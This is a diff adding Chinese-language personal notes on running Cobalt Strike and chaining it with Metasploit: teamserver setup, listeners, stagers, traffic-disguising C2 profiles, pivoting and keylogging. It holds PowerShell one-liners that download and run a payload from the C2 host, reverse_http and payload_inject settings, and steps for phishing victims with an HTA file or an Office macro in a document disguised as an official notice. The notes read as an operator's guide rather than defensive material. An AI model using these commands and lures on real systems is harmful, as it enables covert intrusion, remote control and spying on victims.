@@ -1,0 +1,179 @@
+
+CS使用：
+./teamserver <host> <password> [/path/to/c2.profile] [yyyy-mm-dd]
+C2-profile：设置伪装流量规则
+./c2lint c2-profile 检查c2 profile是否存在错误
+[yyyy-mm-dd]  即团队服务器的有效期，截止时间
+
+运行：输入服务器ip，设置密码.
+root@ubuntu:/# ./teamserver 192.168.43.48 passwz
+默认端口50050，配置端口在启动文件里设置。
+CS服务端除了占用50050一般还会占用80端口，用于网站服务下载什么的。
+
+运行客户端：
+若win，则这些bat文件；若linux，则./start.sh
+用户名可以随意。
+
+客户端建立一个listener-->一般如http类型(应该是指明Beacon的payload是什么类型的)监听，hosts和stager一般写C2服务器端ip，端口如设置8089.若非bind，则为反连，即受害者机器会连c2的哪个端口或c2服务器监听的端口。
+
+其中http hosts和http host(stager)区别：
+1.木马在目标主机A上执行，首先连接http host(stager)这台机器。其相当于作为一个载体，分阶段模式的第一部分，表示从何处下载stager. 也可以用www.testz.com类似域名表示。下载到目标主机后，目标主机在以该stager为基础，尝试连接http hosts内的主机。
+2.在1执行1分钟后，木马控制A再连接http hosts内的主机。其中http host(stager)的ip必须在http hosts内。
+3. http hosts和http host(stager)内的监听端口必须一致。
+
+stage和stager详解：
+stager：即精简的加载器，是socketed协议请求的一段shellcode，用于向c2等服务器请求一定长度数据，该数据前面几个字节是shellcode的长度，后面是shellcode，接收到数据后跳转到shellcode所在的内存处开始运行。可能需要请求和接收好多次，完成shellcode组装后，再执行。
+stage：相当于stager和完整的shellcode的集合，能直接独立运行。
+后面有(S)的表示stage；没有的表示stager；后面有(Stager)的表示stager，没有的表示stage.
+
+如常见的scripted web-delivery(S)即stager，从站点下载汇编执行加载内存，再从指定的http host(stager)下载完完整的
+shellcode(如反连的一段代码什么的)，再执行该shellcode，反连http host内的主机。
+猜测，stager很可能是从http host(stager)和http port(一般是c2)组成的ip:port地址处请求的完整shellcode，即执行反连的payload. 同时反连回来的也是这个端口。更深入的分析需要看代码和更底层的代码。
+
+
+
+attacks->web driver-by-->script web deliver 生成一个web后门。如：
+port 81	//一般指受害者机器访问c2的哪个端口下载payload.
+host 192.168.43.48 //c2地址
+选择刚才的listener //
+type 如powershell
+即靶机通过http访问c2的http网站下载并运行，然后c2返回给到这个listner.
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.43.48:81/tesqz'))"
+
+netstat -anto | findstr "8001"	//查看已建立的TCP连接和对应的PID;且包含8001字符串。
+
+
+
+选择beacon：
+interface：进入类似shell或meterpreter.
+beacon > shell ipconfig	//执行shell命令
+beacon > sleep 0	//则相当于交互式.
+
+
+ip.addr==192.168.43.92 and http
+
+jitter：抖动；心跳。
+
+伪装流量：
+将amazon.profile文件复制到任意一个地方，然后指定即可，如伪装为amazon.com的流量：
+./teamserver 192.168.43.48 pwsswd2 q1/zaqmazozn.profile 
+
+若自写一个test.profile，测试是否有错：
+./c2lint test.profile
+
+lsof -i:8080	//查看8080端口和对应的进程和PID
+
+
+
+
+cs传递给外部的会话payload只支持32位的，如靶机反连msf时，msf监听的paylaod只能设置为32位的。
+sleep 0 	//变为交互式
+
+foreign	//外部监听器，注：cs对该类型现只支持32位的payload.
+故msf监听cs给到的session，最好仅使用32位的payload.
+该payload的ip、port是外部的，如msf主机监听的ip:port.
+
+
+
+
+
+内网联动，cs主要使用SMB、TCP等payload.
+External C2类型payload：即在到达自己的c2之前，先到达设置的这个前置的c2服务器。理解为中转或代理也差不多。
+
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.43.48:8060/loginz'))"
+
+
+tor的很多节点的用户或许早已叛变，归顺FBI，根源还是人啊。
+
+cs联动msf：如选http的foreign payload
+建立listener-->host和port是msf的ip和监听的port.
+
+
+MSF:192.168.43.103 9999
+注：msf等(与cs联动时)监听使用的payload只能是32位的。
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+监听使用的和cs对应，一般为http.
+CS右键会话-->spawn-->选择对应的listerner-->则该会话衍生给到如msf.
+
+会话右键->pivoting->socket代理. 34776
+即将c2服务器设置为socks中转，其他主机可以通过socks和该port连接上c2服务器，进而连上靶机。如此则能直接探测靶机所在网段。
+view->proxy pivots-->tunel 生成命令。
+setg Proxies socks4:192.168.43.48:34776	//msf全局代理
+msf > setg Proxies socks4:192.168.43.48:23456  //执行命令，则代理上该端口。
+则进而使用端口扫描：
+
+添加cs插件，后缀.cna
+
+msf会话-->CS.
+msf6 > use exploit/windows/local/payload_inject 
+设置c2服务器某个listener，设置session.
+# 设置MSF不启动监听(不然的话msf会提示执行成功，但没有会话建立，同时CS也不会接收到会话)
+##默认情况下，payload_inject执行之后会在本地产生一个新的handle，即设置msf不监听，直接返回给到设置的地址--CS.
+msf> set disablepayloadhandler true 
+相当于在靶机新建一个进程，实现反连cs的功能。
+注：payload要对应，一般为windows/meterpreter/reverse_http，且一般会新打开一个记事本(关闭后会失去session)，
+直接在 exploit/windows/local/payload_inject模块中设置PID一般为explorer.exe的PID即可，PPID默认为0就行。
+
+
+即关闭msf的各个监听什么的，让cs或设置的去监听，不然可能会出错。
+msf6 exploit(windows/local/payload_inject) > set disablePayloadHandler true
+
+msf-->cs需要注意的：
+1.cs监听只支持32位的，msf可以使用任意方式获取一个meterpreter，但之后要将该会话给到cs，则cs端监听使用的payload一般为Beacon HTTP类型，c2服务器的ip:port[任意不冲突即可]  ,然后msf使用的paylaod一般需要为：
+msf6 exploit(windows/local/payload_inject) > set payload windows/meterpreter/reverse_http
+2. 此种方式必须会打开notepad，若设置了pid为其他存在的进程，会返回给cs失败。暂时没想到解决办法。
+3. cs若要迁移进程，需要使用.nse脚本。
+
+cs view-->keystrokes[键盘记录]-->进入interact，输入keylogger命令-->查看到记录。
+
+
+
+cmd命令：
+tasklist	查看进程、PID
+netstat -anto 查看进程、PID、tcp连接的远程地址等。
+
+taskkill常见用法：
+-t 	//终止指定进程
+-f 	//强制
+eg1：
+taskkill /pid 3252 -t -f 	//强制终止pid为3252的进程
+
+
+
+wmic process where Name="chrome.exe" get ParentProcessId	查看进程名为chrome.exe的所有PPID
+
+
+java -Dfile.encoding=utf-8 z.jar    //添加此参数，即可解决中文乱码。
+
+cs对session提权成功后，user后有*
+cs生成的paylload带S表示不分阶段。
+
+
+
+Metasploit连接到cs的Socks代理服务：
+CS 中创建好代理后，在 Metasploit 中可运行以下命令通过beacon的Socks代理(因为是针对某一个beacon进行设置socks代理的，故msf连接该socks后，相当于直连上cs，也相当于直连上该beacon)进行通信。
+setg Proxies socks4:192.168.43.116:[port]	//msf设置该全局代理
+setg ReverseAllowProxy true			//msf全局开启正反都走代理
+
+unsetg Proxies	//停止该代理
+setg和unsetg表示在metasploit中全局有效，不需每次选择模块后再重新设置。
+
+
+cs-->VPN interfaces：即让靶机通过vpn的方式上线c2.
+
+
+HTA：即html的app，以此方式独立运行。默认ie执行。
+如选择powershell方式生成hta，靶机双击运行，cs正常设置一个beacon_http的listener，成功获取session。
+
+
+
+
+
+MS office macro宏：即office以代码等方式执行office的功能。一系列office操作的命令集合。
+步骤：选择listener->copy代码，office->视图->宏->查看宏->创建->复制进去  或直接搜索"宏". 一般选"所有的活动模板和文档"-->将该文档保存命令为"上级通知.docx"-->对方双击，则直接获得session.
+核心：宏的命令一般是VB编辑器打开，保存，直接运行即可获得session.
+
+
+生成c的payload：一般都是shellcode.
+
